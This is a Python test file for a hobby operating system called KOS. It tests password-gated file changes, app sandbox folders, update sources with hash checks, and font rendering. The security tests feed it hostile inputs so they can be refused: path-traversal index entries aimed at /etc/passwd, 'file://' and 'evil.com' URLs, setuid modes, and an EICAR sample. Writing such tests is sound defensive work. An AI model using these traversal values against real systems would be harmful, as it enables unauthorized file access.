class TestFsChange(AdminEnv):
    def setUp(self):
        super().setUp()
        self.kb_ = self.booted()
        self.work = Path(self.tmp.name) / "w"
        self.work.mkdir()

    def go(self, op, path, *answers, **kw):
        return fs_change(self.paths, self.authority(*answers), self.kb_, op, str(path), **kw)

    def test_mkdir_rename_chmod_and_trash(self):
        self.assertIn("made folder", self.go("mkdir", self.work / "d", PW))
        (self.work / "f.txt").write_text("x")
        self.go("rename", self.work / "f.txt", PW, to=str(self.work / "g.txt"))
        self.assertTrue((self.work / "g.txt").exists() and not (self.work / "f.txt").exists())
        self.go("chmod", self.work / "g.txt", PW, mode="600")
        self.assertEqual(oct((self.work / "g.txt").stat().st_mode & 0o777), "0o600")
        self.go("trash", self.work / "g.txt", PW)
        self.assertFalse((self.work / "g.txt").exists())
        trashed = list((self.paths.state / "trash").glob("*-g.txt"))
        self.assertEqual([t.read_text() for t in trashed], ["x"])           # recoverable, not destroyed

    def test_it_needs_the_password_and_the_admin_keyboard(self):
        with self.assertRaises(AuthorizationDenied):
            self.go("mkdir", self.work / "d", "no", "no", "no")
        self.assertFalse((self.work / "d").exists())
        self.kb_.shutdown()
        with self.assertRaises(FsChangeError) as ctx:
            self.go("mkdir", self.work / "d")                              # refused before any prompt
        self.assertIn("admin.keyboard", str(ctx.exception))

    def test_the_guards_hold(self):
        (self.work / "f").write_text("x")
        (self.work / "g").write_text("y")
        self.paths.ensure()
        for op, path, kw in (("trash", self.paths.state, {}), ("chmod", self.paths.etc, {"mode": "777"}),
                             ("mkdir", self.paths.state / "evil", {}), ("trash", "/", {}),
                             ("rename", self.work / "f", {"to": str(self.work / "g")}),   # no overwrite
                             ("chmod", self.work / "f", {"mode": "4755"}),                 # no setuid
                             ("chmod", self.work / "f", {"mode": "2755"}),
                             ("chmod", self.work / "f", {"mode": "rwx"}),
                             ("trash", self.work / "nope", {}), ("mkdir", self.work / "f", {}),
                             ("format", self.work / "f", {})):
            with self.assertRaises(FsChangeError, msg=(op, path)):
                self.go(op, path, **kw)
        self.assertEqual((self.work / "g").read_text(), "y")

    def test_old_trash_is_forgotten_by_optimize(self):
        (self.work / "f.txt").write_text("x")
        self.go("trash", self.work / "f.txt", PW)
        self.assertEqual(empty_old_trash(self.paths), 0)                   # fresh: kept
        self.assertEqual(empty_old_trash(self.paths, now=_time.time() + 40 * 86400), 1)
        self.assertEqual(list((self.paths.state / "trash").iterdir()), [])


class TestServiceBridge(Env):
    def ask(self, req, *answers):
        sent = []
        SystemBridge(self.paths).handle({"cmd": "request", **req}, sent.append, self.authority(*answers))
        return sent[-1]

    def test_sys_returns_every_kind_as_json(self):
        for kind in osinfo.KINDS:
            r = self.ask({"action": "sys", "kind": kind, "arg": "/etc"})
            self.assertEqual((r["cmd"], r["kind"]), ("sys", kind))
            json.dumps(r)

    def test_signal_through_the_bridge_needs_the_password(self):
        proc = _subp.Popen(["sleep", "60"])
        self.addCleanup(lambda: (proc.kill(), proc.wait()))
        r = self.ask({"action": "signal", "pid": proc.pid, "sig": "TERM"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertIsNone(proc.poll())
        r = self.ask({"action": "signal", "pid": proc.pid, "sig": "TERM"}, PW)
        self.assertTrue(r["ok"])
        self.assertEqual(proc.wait(5), -15)
        self.assertFalse(self.ask({"action": "signal", "pid": 1, "sig": "KILL"})["ok"])

    def test_the_internet_check_contacts_the_outside_only_after_the_password(self):
        calls = []
        with mock.patch("kos.osinfo.net_check", lambda *a, **k: (calls.append(1), (True, "internet reachable (9 ms)"))[1]):
            r = self.ask({"action": "netcheck"}, "no", "no", "no")
            self.assertFalse(r["ok"])
            self.assertEqual(calls, [])
            r = self.ask({"action": "netcheck"}, PW)
        self.assertEqual((r["ok"], calls), (True, [1]))

    def test_ticks_flag_is_recorded_from_the_manifest(self):
        out = Path(self.tmp.name) / "p.kapp"
        pack(SYSTEM_DIR / "processes", out)
        self.assertIn("ticks", KApp.from_file(out).manifest.permissions)


class TestServiceAppsRunForReal(DesktopSessionEnv):
    """Each OS-service app, started by `npm run start` inside the sandbox, drawing real data."""

    def go(self, name, keys=(), wait=5.0, needles=()):
        s = self.start(SYSTEM_DIR / name, name, bridge=SystemBridge(self.paths), ticks=True)
        self.boot_both()
        if keys:
            threading.Timer(3.0, lambda: self.devices.push(*keys)).start()
        threading.Timer(wait, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        for needle in needles:
            self.assertIn(needle, out, f"{name}: {needle!r} not on screen")
        return out

    def test_processes(self):
        self.go("processes", needles=("Tasks", "PID", "USER", "sorted by cpu"))

    def test_memory(self):
        self.go("memory", needles=("Physical memory", "RAM", "Swap", "Biggest users"))

    def test_filesystem(self):
        self.go("filesystem", needles=("Mounts", "TYPE", "nosuid"))

    def test_devices(self):
        self.go("devices", needles=("Disks", "Input", "Drivers"))

    def test_network(self):
        self.go("network", needles=("Interfaces", "gateway", "internet:"))

    def test_isolation(self):
        self.go("isolation", needles=("Apps", "Kernel hardening", "Access"))

    def test_health(self):
        self.go("health", needles=("Overall", "Hardware", "Connectivity"))

    def test_resources(self):
        self.go("resources", needles=("CPU", "Memory", "Disk", "KOS apps"))

    def test_updates(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.go("updates", needles=("Where things come from", "hello", "local file", "KOS itself", "Underneath", "python"))

    def test_apps_with_the_ticks_permission_get_a_tick_every_second_and_others_do_not(self):
        s = self.start(EXAMPLE, "hello", "cmd", ticks=True)
        self.boot_both()
        threading.Timer(3.2, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=0.3)
        self.assertGreaterEqual(self.output().count('"cmd":"tick"'), 2)

    def test_filesystem_makes_a_folder_with_the_admin_keyboard_and_a_password(self):
        work = Path(self.tmp.name) / "w"
        work.mkdir()
        kb = AdminKeyboard(self.paths, kernel_report=lambda: dict(GOOD_KERNEL),
                           probe=lambda: ["/dev/input/event0"], boot_id=lambda: "boot-1")
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "filesystem", "filesystem", bridge=SystemBridge(self.paths),
                           authority=auth, ticks=True)
            self.boot_both()
            threading.Timer(3.0, lambda: self.devices.push(*_keys("2/" + str(work)), ENTER)).start()
            threading.Timer(6.0, lambda: self.devices.push(*_keys("m"), *_keys("newdir"), ENTER)).start()
            self.when_modal("Password to change files", [*_keys(PW), ENTER])
            threading.Timer(12.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertTrue((work / "newdir").is_dir())
        self.assertEqual(oct((work / "newdir").stat().st_mode & 0o777), "0o700")


# ---------------------------------------------------------------------------
# Where everything comes from, and updating it
# ---------------------------------------------------------------------------
import functools as _ft  # noqa: E402
import hashlib as _hl  # noqa: E402
import http.server as _http  # noqa: E402
import shutil as _shutil  # noqa: E402
from kos import provenance  # noqa: E402
from kos.sources import SourceError, Sources  # noqa: E402


def make_kapp(tmp: Path, version: str, *, permissions=(), extra: bytes = b"", name="hello") -> Path:
    """A real, valid npm app (a copy of hello) at the given version, packed into tmp."""
    src = Path(tempfile.mkdtemp(dir=tmp))
    _shutil.copytree(EXAMPLE, src / name)
    m = json.loads((src / name / "manifest.json").read_text())
    m.update(version=version, name=name, permissions=list(permissions))
    (src / name / "manifest.json").write_text(json.dumps(m))
    pkg = json.loads((src / name / "package.json").read_text())
    pkg.update(version=version, name=name)
    (src / name / "package.json").write_text(json.dumps(pkg))
    if extra:
        (src / name / "extra.bin").write_bytes(extra)
    out = tmp / f"{name}-{version}-{len(permissions)}{'x' if extra else ''}.kapp"
    pack(src / name, out)
    return out


class TestAppFolders(Env):
    """Every app has its own folder: persistent, writable by that app alone, kept when the app is removed."""

    DRIVER = (
        "import json, os\n"
        "from kos.sdk import App\n"
        "def main():\n"
        "    app = App()\n"
        "    for ev in app.events():\n"
        "        if ev.get('cmd') != 'launch': continue\n"
        "        job = json.loads(json.loads(ev['line'])['program']); d = os.environ.get('KOS_DATA_DIR'); out = {'dir': d}\n"
        "        f = os.path.join(d, 'note.txt')\n"
        "        out['before'] = open(f).read() if os.path.exists(f) else ''\n"
        "        open(f, 'a').write(job['text'])\n"
        "        for other in job.get('peek', []):\n"
        "            try: out['peek_' + os.path.basename(other)] = os.listdir(other)\n"
        "            except OSError as e: out['peek_' + os.path.basename(other)] = 'denied'\n"
        "        try: open(os.path.join(os.path.dirname(d), 'x-planted'), 'w').write('x'); out['planted'] = True\n"
        "        except OSError: out['planted'] = False\n"
        "        app.log('RESULT ' + json.dumps(out)); return\n")

    def install(self, name):
        src = Path(tempfile.mkdtemp(dir=self.tmp.name))
        (src / "driver.py").write_text(self.DRIVER)
        (src / "manifest.json").write_text(json.dumps({
            "name": name, "version": "1.0", "runtime": "python", "entry": "driver:main", "modes": ["cmd"],
            "permissions": [], "driver": "quantum", "description": "test"}))
        kapp = Path(self.tmp.name) / f"{name}.kapp"
        pack(src, kapp)
        AppStore(self.paths).install(kapp, self.authority(PW))
        from kos.permit import PermitStore
        PermitStore(self.paths).grant(name)

    def job(self, name, payload):
        from kos import qjob
        return qjob.run_job(self.paths, self.authority(PW), name, {"program": json.dumps(payload)})

    def test_the_folder_persists_between_runs_and_is_private_to_its_app(self):
        self.install("alpha")
        self.install("beta")
        a1 = self.job("alpha", {"text": "one;"})
        self.assertEqual((a1["before"], a1["dir"]), ("", str(self.paths.appdata / "alpha")))
        b1 = self.job("beta", {"text": "other;", "peek": [str(self.paths.appdata / "alpha")]})
        self.assertEqual(b1["before"], "")                                    # beta did not see alpha's file
        self.assertEqual(b1["peek_alpha"], "denied")                          # and cannot list alpha's folder
        a2 = self.job("alpha", {"text": "two;"})
        self.assertEqual(a2["before"], "one;")                                # alpha's own data came back
        self.assertFalse(a2["planted"])                                       # it cannot write next to its folder either

    def test_removing_an_app_keeps_its_folder_until_you_purge_it(self):
        self.install("alpha")
        self.job("alpha", {"text": "keep;"})
        AppStore(self.paths).remove("alpha", self.authority(PW))
        self.assertTrue((self.paths.appdata / "alpha" / "note.txt").exists())
        self.install("alpha")
        self.assertEqual(self.job("alpha", {"text": ""})["before"], "keep;")
        self.assertTrue(self.paths.purge_data("alpha"))
        self.assertFalse((self.paths.appdata / "alpha").exists())
        self.assertFalse(self.paths.purge_data("alpha"))

    def test_the_folder_is_made_private_and_a_stray_link_is_never_followed_by_purge(self):
        d = self.paths.data_dir("gamma")
        self.assertEqual(oct(d.stat().st_mode & 0o777), oct(0o700) if os.geteuid() else oct(0o700))
        link = self.paths.appdata / "delta"
        link.symlink_to(self.tmp.name)
        self.assertFalse(self.paths.purge_data("delta"))
        self.assertTrue(Path(self.tmp.name).exists())


class TestProvenance(Env):
    def test_an_installed_app_remembers_where_it_came_from(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        a = provenance.apps(self.paths)[0]
        self.assertEqual((a["name"], a["source"], a["via"], a["known"]), ("hello", "local file", "install", True))
        self.assertEqual(a["location"], str(self.kapp))

    def test_apps_from_before_the_ledger_say_unknown_and_a_swapped_app_says_changed(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        provenance.ledger_path(self.paths).unlink()
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "unknown")
        provenance.record(self.paths, "hello", "1.0", "0" * 64, source="elsewhere", location="x", via="install")
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "changed since recorded")

    def test_core_and_runtimes_are_reported_from_the_real_machine(self):
        c = provenance.core()
        self.assertEqual(c["kind"], "git")
        self.assertRegex(c["commit"], r"^[0-9a-f]{7,}$")
        self.assertNotIn("@", c["origin"].split("://", 1)[-1].split("/", 1)[0])      # no embedded credentials
        names = [r["name"] for r in provenance.runtimes()]
        for want in ("python", "node.js", "npm", "linux kernel"):
            self.assertIn(want, names)
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(provenance.core(Path(d))["kind"], "image")


class TestSourcesAndUpdates(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))           # hello 1.0
        self.srv = Path(self.tmp.name) / "srv"
        self.srv.mkdir()
        self.src = Sources(self.paths)

    def add_folder(self, name="shelf"):
        self.src.add(self.authority(PW), name, "folder", str(self.srv))

    def put(self, version, **kw):
        k = make_kapp(Path(self.tmp.name), version, **kw)
        _shutil.copy(k, self.srv / k.name)
        return k

    def installed_version(self):
        return {a.name: a.version for a in AppStore(self.paths).installed()}["hello"]

    # --- the list of sources ---------------------------------------------------
    def test_adding_and_removing_a_source_needs_the_password_and_valid_input(self):
        with self.assertRaises(AuthorizationDenied):
            self.src.add(self.authority("no", "no", "no"), "shelf", "folder", str(self.srv))
        self.assertEqual(self.src.list(), [])
        self.add_folder()
        self.assertEqual([s["name"] for s in self.src.list()], ["shelf"])
        for kind, loc in (("folder", "relative/dir"), ("folder", "/nonexistent-dir"), ("github", "not a repo"),
                          ("github", "a/b/c"), ("https", "http://example.com"), ("https", "https://u:p@example.com/x"),
                          ("https", "https://example.com/x?token=1"), ("ftp", "x"), ("https", "file:///etc")):
            with self.assertRaises(SourceError, msg=(kind, loc)):
                self.src.add(self.authority(PW), "other", kind, loc)
        with self.assertRaises(SourceError):
            self.src.add(self.authority(PW), "shelf", "folder", str(self.srv))       # duplicate
        with self.assertRaises(SourceError):
            self.src.add(self.authority(PW), "Bad Name", "folder", str(self.srv))
        self.src.remove(self.authority(PW), "shelf")
        self.assertEqual(self.src.list(), [])

    # --- checking and installing from a folder ------------------------------------
    def test_check_needs_the_password_and_finds_only_newer_versions(self):
        self.add_folder()
        self.put("1.1")
        self.put("0.9", extra=b"old")                                              # older: never offered
        with self.assertRaises(AuthorizationDenied):
            self.src.check(self.authority("no", "no", "no"), include_core=False)
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual([(u["name"], u["installed"], u["version"], u["source"]) for u in r["updates"]],
                         [("hello", "1.0", "1.1", "shelf")])
        self.assertEqual(r["new"], [])

    def test_install_updates_records_where_it_came_from_and_clears_the_pending_update(self):
        self.add_folder()
        k = self.put("1.1")
        self.src.check(self.authority(PW), include_core=False)
        msg = self.src.install(self.authority(PW), "hello")
        self.assertIn("1.0 -> 1.1", msg)
        self.assertEqual(self.installed_version(), "1.1")
        a = provenance.apps(self.paths)[0]
        self.assertEqual((a["source"], a["via"], a["known"]), ("shelf", "update", True))
        self.assertEqual(a["location"], str(self.srv / k.name))
        self.assertEqual(self.src.last_report()["updates"], [])
        with self.authority(PW).authorize("app.run", "hello") as g:
            self.assertEqual(AppStore(self.paths).load_verified("hello", g).manifest.version, "1.1")   # sealed + verifies

    def test_install_without_a_check_and_a_wrong_password_do_nothing(self):
        self.add_folder()
        self.put("1.1")
        with self.assertRaises(SourceError):
            self.src.install(self.authority(PW), "hello")
        self.src.check(self.authority(PW), include_core=False)
        with self.assertRaises(AuthorizationDenied):
            self.src.install(self.authority("no", "no", "no"), "hello")
        self.assertEqual(self.installed_version(), "1.0")

    def test_a_new_app_is_offered_installed_but_not_permitted(self):
        self.add_folder()
        self.put("1.0", name="clock")
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual([n["name"] for n in r["new"]], ["clock"])
        self.assertIn("still needs: permit clock", self.src.install(self.authority(PW), "clock"))
        self.assertFalse(PermitStore(self.paths).is_permitted("clock"))

    def test_an_update_that_asks_for_new_permissions_is_held_back_until_approved(self):
        self.add_folder()
        self.put("1.2", permissions=("network",))
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual(r["updates"][0]["adds_permissions"], ["network"])
        with self.assertRaises(SourceError) as ctx:
            self.src.install(self.authority(PW), "hello")
        self.assertIn("NEW permissions (network)", str(ctx.exception))
        self.assertEqual(self.installed_version(), "1.0")
        self.assertEqual([l for l in self.src.install_all(self.authority())][0].split(":")[0], "hello")   # skipped, no prompt
        self.src.install(self.authority(PW), "hello", allow_new_permissions=True)
        self.assertEqual(self.installed_version(), "1.2")

    def test_a_flagged_update_is_quarantined_and_the_old_version_stays(self):
        self.add_folder()
        self.put("1.1", extra=EICAR)
        self.src.check(self.authority(PW), include_core=False)
        with self.assertRaises(VirusFoundError):
            self.src.install(self.authority(), "hello")                             # refused before any password
        self.assertEqual(self.installed_version(), "1.0")
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("hello-*.kapp"))), 1)

    # --- an https source (a real local web server) ---------------------------------
    def serve(self, directory):
        handler = _ft.partial(_http.SimpleHTTPRequestHandler, directory=str(directory))
        handler.log_message = lambda *a, **k: None
        httpd = _http.ThreadingHTTPServer(("127.0.0.1", 0), handler)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        self.addCleanup(lambda: (httpd.shutdown(), httpd.server_close()))
        return f"http://127.0.0.1:{httpd.server_port}"

    def index(self, *entries):
        (self.srv / "kapps.json").write_text(json.dumps({"apps": list(entries)}))

    def entry(self, k: Path, **over):
        return {"name": "hello", "version": "1.1", "file": k.name, "sha256": _hl.sha256(k.read_bytes()).hexdigest(), **over}

    def test_a_website_source_downloads_and_verifies_the_hash(self):
        k = self.put("1.1")
        self.index(self.entry(k))
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        r = web.check(self.authority(PW), include_core=False)
        self.assertEqual(r["updates"][0]["ref"], f"{base}/{k.name}")
        web.install(self.authority(PW), "hello")
        self.assertEqual(self.installed_version(), "1.1")
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "site")

    def test_a_download_that_does_not_match_its_advertised_hash_is_refused(self):
        k = self.put("1.1")
        self.index(self.entry(k, sha256="0" * 64))
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        web.check(self.authority(PW), include_core=False)
        with self.assertRaises(SourceError) as ctx:
            web.install(self.authority(), "hello")
        self.assertIn("does not match the hash", str(ctx.exception))
        self.assertEqual(self.installed_version(), "1.0")

    def test_the_index_cannot_name_a_different_app_or_escape_its_folder(self):
        k = self.put("1.1")
        self.index(self.entry(k, file="../../etc/passwd"), self.entry(k, name="../evil"),
                   self.entry(k, version="x" * 90), {"name": "hello"}, "junk",
                   self.entry(k, name="other"))                                      # right file, wrong name
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        r = web.check(self.authority(PW), include_core=False)
        self.assertEqual([n["name"] for n in r["new"]], ["other"])                   # only the well-formed one survives
        with self.assertRaises(SourceError) as ctx:
            web.install(self.authority(PW), "other")                                 # but the file is hello 1.1
        self.assertIn("not what the index said", str(ctx.exception))

    def test_plain_http_to_the_outside_world_is_never_fetched(self):
        """Refused by POLICY (checked before any connection is attempted), not merely unreachable."""
        from kos.sources import fetch
        calls = []
        with mock.patch("urllib.request.OpenerDirector.open", lambda *a, **k: calls.append(1)):
            for url in ("http://example.com/kapps.json", "file:///etc/passwd", "ftp://example.com/x",
                        "http://127.0.0.1.evil.com/x"):
                with self.assertRaises(SourceError, msg=url) as ctx:
                    fetch(url, 1000)
                self.assertIn("only https", str(ctx.exception), url)
            with self.assertRaises(SourceError) as ctx:
                fetch("https://user:pw@example.com/x", 1000)
            self.assertIn("must not contain a password", str(ctx.exception))
            with self.assertRaises(SourceError):
                fetch("http://127.0.0.1:1/x", 1000)                    # loopback http only when allow_http
        self.assertEqual(calls, [])                                   # no connection was even attempted

    def test_an_unreachable_source_is_an_error_line_not_a_crash(self):
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "dead", "https", "http://127.0.0.1:9")
        self.add_folder()
        self.put("1.1")
        r = web.check(self.authority(PW), include_core=False)
        self.assertTrue(r["errors"] and r["errors"][0].startswith("dead:"))
        self.assertEqual(r["updates"][0]["version"], "1.1")                          # the folder source still worked


class TestUpdatingKosItself(Env):
    def git(self, cwd, *args):
        return _sp.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", *args],
                       cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()

    def setUp(self):
        super().setUp()
        base = Path(self.tmp.name)
        self.origin, self.clone, self.pusher = base / "origin.git", base / "clone", base / "pusher"
        _sp.run(["git", "init", "-q", "--bare", "-b", "main", str(self.origin)], check=True)
        _sp.run(["git", "clone", "-q", str(self.origin), str(self.clone)], check=True, capture_output=True)
        (self.clone / "kos.txt").write_text("v1")
        self.git(self.clone, "add", "."); self.git(self.clone, "commit", "-q", "-m", "first")
        self.git(self.clone, "push", "-q", "origin", "HEAD:main")
        self.git(self.clone, "branch", "-q", "--set-upstream-to=origin/main")
        _sp.run(["git", "clone", "-q", str(self.origin), str(self.pusher)], check=True, capture_output=True)
        self.src = Sources(self.paths, core_root=self.clone)

    def publish(self, text, msg):
        (self.pusher / "kos.txt").write_text(text)
        self.git(self.pusher, "add", "."); self.git(self.pusher, "commit", "-q", "-m", msg)
        self.git(self.pusher, "push", "-q", "origin", "HEAD:main")

    def test_it_sees_new_commits_and_fast_forwards_with_the_password(self):
        self.assertEqual(self.src.core_status()["behind"], 0)
        self.publish("v2", "second change")
        self.publish("v3", "third change")
        st = self.src.core_status()
        self.assertEqual((st["behind"], st["subjects"]), (2, ["third change", "second change"]))
        with self.assertRaises(AuthorizationDenied):
            self.src.core_update(self.authority("no", "no", "no"))
        self.assertEqual((self.clone / "kos.txt").read_text(), "v1")
        self.assertIn("restart KOS", self.src.core_update(self.authority(PW)))
        self.assertEqual((self.clone / "kos.txt").read_text(), "v3")
        self.assertEqual(self.src.core_update(self.authority()), "KOS is up to date")

    def test_it_never_touches_a_modified_checkout_or_a_diverged_branch(self):
        self.publish("v2", "second")
        (self.clone / "kos.txt").write_text("local edit")
        with self.assertRaises(SourceError) as ctx:
            self.src.core_update(self.authority())
        self.assertIn("uncommitted", str(ctx.exception))
        self.assertEqual((self.clone / "kos.txt").read_text(), "local edit")
        self.git(self.clone, "commit", "-q", "-am", "my own commit")                 # now it has diverged
        with self.assertRaises(SourceError) as ctx:
            self.src.core_update(self.authority(PW))
        self.assertIn("cannot fast-forward", str(ctx.exception))

    def test_a_system_image_is_updated_by_a_new_image(self):
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(SourceError) as ctx:
                Sources(self.paths, core_root=Path(d)).core_update(self.authority())
            self.assertIn("new image", str(ctx.exception))


class TestUpdatesThroughTheBridge(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.srv = Path(self.tmp.name) / "srv"
        self.srv.mkdir()

    def ask(self, req, *answers):
        sent = []
        with mock.patch.object(Sources, "core_status", lambda self: {"kind": "image", "behind": 0, "subjects": []}):
            SystemBridge(self.paths).handle({"cmd": "request", "action": "updates", **req}, sent.append,
                                            self.authority(*answers))
        return sent[-1]

    def test_the_whole_flow(self):
        r = self.ask({"op": "provenance"})
        self.assertEqual((r["cmd"], r["data"]["apps"][0]["name"], r["data"]["sources"]), ("updates", "hello", []))
        self.assertTrue(self.ask({"op": "source_add", "name": "shelf", "kind": "folder", "location": str(self.srv)}, PW)["ok"])
        k = make_kapp(Path(self.tmp.name), "1.1")
        _shutil.copy(k, self.srv / k.name)
        self.assertFalse(self.ask({"op": "check"}, "no", "no", "no")["ok"])
        report = self.ask({"op": "check"}, PW)["data"]
        self.assertEqual(report["updates"][0]["version"], "1.1")
        self.assertIn("hello", self.ask({"op": "provenance"})["data"]["last"]["updates"][0]["name"])
        self.assertTrue(self.ask({"op": "install", "name": "hello"}, PW)["ok"])
        self.assertEqual({a.name: a.version for a in AppStore(self.paths).installed()}["hello"], "1.1")
        self.assertTrue(self.ask({"op": "source_remove", "name": "shelf"}, PW)["ok"])


class TestNoTicksWithoutThePermission(DesktopSessionEnv):
    def test_a_session_without_ticks_never_sends_one(self):
        s = self.start(EXAMPLE, "hello", "cmd")
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=0.3)
        self.assertNotIn('"cmd":"tick"', self.output())


class TestUpdatesProtocol(unittest.TestCase):
    def v(self, **m):
        return validate_app_message({"cmd": "request", "action": "updates", **m}, "tui")

    def test_valid_and_hostile(self):
        self.assertEqual(self.v(op="check")["op"], "check")
        self.assertTrue(self.v(op="install", name="hello", permissions=True)["permissions"])
        self.assertFalse(self.v(op="install", name="hello", permissions="yes")["permissions"])
        self.assertEqual(self.v(op="source_add", name="shelf", kind="github", location="me/repo")["kind"], "github")
        for bad in (dict(op="rm"), dict(op="install"), dict(op="install", name="../x"),
                    dict(op="source_add", name="s", kind="ftp", location="x"),
                    dict(op="source_add", name="s", kind="folder", location=""),
                    dict(op="source_add", name="s", kind="folder", location="x" * 400)):
            with self.assertRaises(ProtocolError, msg=bad):
                self.v(**bad)


class TestTrueType(unittest.TestCase):
    """The OS rasterizes TrueType itself; apps send `stext` and never see a font file."""

    @classmethod
    def setUpClass(cls):
        from kos import ttf
        cls.ttf = ttf
        cls.font = ttf.load("sans")
        if cls.font is None:
            raise unittest.SkipTest("no TrueType sans font on this machine")

    def test_glyph_coverage_matches_the_shape(self):
        bm = self.font.bitmap("l", 40)                       # a tall stem: inked in the middle, empty at the edges
        mid = bm.h // 2
        self.assertGreater(bm.cov[mid * bm.w + bm.w // 2], 200)
        self.assertEqual(bm.cov[mid * bm.w], 0)
        self.assertEqual(bm.cov[0], 0)
        o = self.font.bitmap("o", 40)                        # a counter: the middle of an 'o' is empty
        self.assertLess(o.cov[(o.h // 2) * o.w + o.w // 2], 20)
        self.assertGreater(sum(o.cov), 0)

    def test_width_is_proportional_and_scales(self):
        f = self.font
        self.assertLess(f.width("iii", 20), f.width("mmm", 20))
        self.assertAlmostEqual(f.width("Hello", 40), 2 * f.width("Hello", 20), delta=0.5)
        self.assertEqual(f.width("", 20), 0)

    def test_stext_draws_smoothly_into_the_framebuffer(self):
        fb = Framebuffer(120, 30)
        fb.clear(parse_color("#000000"))
        fb.apply([["stext", 4, 4, "Hg", "#ffffff", 20, 0]])
        levels = {fb.pixel(x, y)[0] for x in range(120) for y in range(30)}
        self.assertGreater(len(levels), 8)                   # anti-aliased: many grey levels, not just black/white
        self.assertEqual(fb.pixel(119, 29), (0, 0, 0))

    def test_stext_is_clipped_not_a_crash_when_off_screen(self):
        fb = Framebuffer(20, 20)
        fb.apply([["stext", -30, -5, "Hello", "#ffffff", 40, 1], ["stext", 15, 15, "Hello", "#ffffff", 40, 0]])

    def test_protocol_validates_stext(self):
        ok = validate_app_message({"cmd": "frame", "ops": [["stext", 1, 2, "hi", "#0078D4", 14, 1]]}, "graphical")
        self.assertEqual(ok["ops"], [["stext", 1, 2, "hi", "#0078d4", 14, 1]])
        for bad in (["stext", 1, 2, "hi", "#0078d4", 2], ["stext", 1, 2, "hi", "#0078d4", 999], ["stext", 1, 2, "hi", "blue", 14],
                    ["stext", 1, 2, "hi", "#0078d4", 14, 7], ["stext", 1, 2, 5, "#0078d4", 14]):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "frame", "ops": [bad]}, "graphical")

    def test_apps_get_advances_to_lay_text_out(self):
        m = self.font.metrics()
        self.assertEqual(len(m["adv"]), 95)                  # printable ASCII
        self.assertGreater(m["adv"][ord("m") - 32], m["adv"][ord("i") - 32])
        self.assertGreater(m["asc"], 0)


class TestShellDesign(Env):
    """The top-panel-and-floating-dock layout: top panel, floating centered dock, windows kept clear of both."""

    def make(self, w=1280, h=720):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(PW), HeadlessBackend(w, h), ScriptedDevices(), preboot=())

    def test_the_interface_is_a_menubar_and_a_dock_not_a_taskbar(self):
        from kos.shell import CORE
        self.assertIn("menubar", CORE)
        self.assertIn("dock", CORE)
        for gone in ("taskbar", "start", "tray"):
            self.assertNotIn(gone, CORE)

    def test_menubar_spans_the_top_and_the_dock_floats_centered_at_the_bottom(self):
        for w, h in ((1280, 720), (1920, 1080), (800, 600)):
            s = self.make(w, h)
            kind, (x, y, bw, bh) = s.core_rect("menubar")
            self.assertEqual((kind, x, y, bw), ("bar", 0, 0, w))
            kind, (dx, dy, dw, dh) = s.core_rect("dock")
            self.assertEqual(kind, "dock")
            self.assertEqual(dx * 2 + dw, w, "centered")
            self.assertLess(dy + dh, h, "floats: there is a margin under it")
            self.assertGreater(dy, h // 2)

    def test_the_dock_stays_centered_whatever_width_it_asks_for(self):
        s = self.make()
        for want in (200, 333, 701):
            s.dock_w = want
            x, y, w, h = s.dock_rect()
            self.assertEqual((x, w), ((s.W - want) // 2, want))
        s.dock_w = 10 ** 6
        self.assertLessEqual(s.dock_rect()[2], s.W)

    def test_new_windows_open_between_the_panel_and_the_dock(self):
        for w, h in ((1280, 720), (1920, 1080), (800, 600)):
            s = self.make(w, h)
            for _ in range(8):                               # cascade
                x, y, ww, wh = s.window_rect()
                self.assertGreaterEqual(y, s.bar_h)
                self.assertLessEqual(y + wh, s.dock_top)
                self.assertGreaterEqual(x, 0)
                self.assertLessEqual(x + ww, s.W)

    def test_widgets_and_icons_start_below_the_menubar(self):
        s = self.make()
        for name in ("pins", "search", "widgets", "sidebar"):
            self.assertGreaterEqual(s.core_rect(name)[1][1], s.bar_h, name)
        pins = s.core_rect("pins")[1]
        self.assertLessEqual(pins[1] + pins[3], s.dock_top)

    def test_accent_is_the_kos_blue_and_no_muddy_navy_is_left_in_the_interface(self):
        from kos import shell
        self.assertEqual(shell.ACCENT, "#0078d4")
        for path in list((SYSTEM_DIR).glob("*/app.js")) + [SDK_JS / "gfx.js"]:
            text = path.read_text().lower()
